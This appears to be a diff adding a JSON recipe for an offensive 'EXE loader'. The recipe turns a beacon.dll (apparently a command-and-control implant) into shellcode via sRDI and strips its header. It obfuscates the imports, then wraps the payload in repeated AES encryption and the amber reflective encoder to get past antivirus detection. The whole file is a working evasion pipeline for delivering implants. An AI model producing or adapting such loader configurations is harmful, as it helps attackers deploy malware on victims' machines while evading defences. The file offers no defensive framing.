@@ -1,0 +1,54 @@
+{
+	"name":"BASICBITCH",
+	"version":"0.1",
+	"author":"david",
+	"description":"EXE loader",
+	"TTP":[],
+	"stages": [
+		{
+			"action":"exe2shellcode_srdi",
+			"action_prereqs":"",
+			"action_params": {
+				"exe_x64": {
+					"path_val" : "/Users/david/beacon.dll"
+				},
+				"exe_x86": {
+					"path_val" : "/Users/david/beacon.dll"
+				},
+                "function_name": "StartW",
+                "function_args": "",
+                "clear_header": true,
+                "obfuscate_imports": true,
+                "delay": 1
+			}
+		},
+        {
+			"action":"aes_encrypt",
+            "action_prereqs":"",
+			"action_params": {
+                "password": "123456"
+			}
+		},
+		{
+			"action":"amber",
+			"action_prereqs":"",
+			"action_params": {
+                "encode_count": 5,
+                "_encode_count_comments": "Number of times to encode the generated reflective payload",
+                "max_obfuscation_bytes": 5,
+                "_max_obfuscation_bytes_comments": "Maximum number of bytes for obfuscation (default 5)",
+                "resolver": "iat", 
+                "_resolver_comments": "Use IAT API resolver block instead of CRC API resolver block"
+                
+			}
+			
+		},
+		{
+			"action":"AESencrypt",
+			"action_params": {
+                "iv": "iv_here",
+                "key": "key_here"
+			}
+		}
+	]
+}
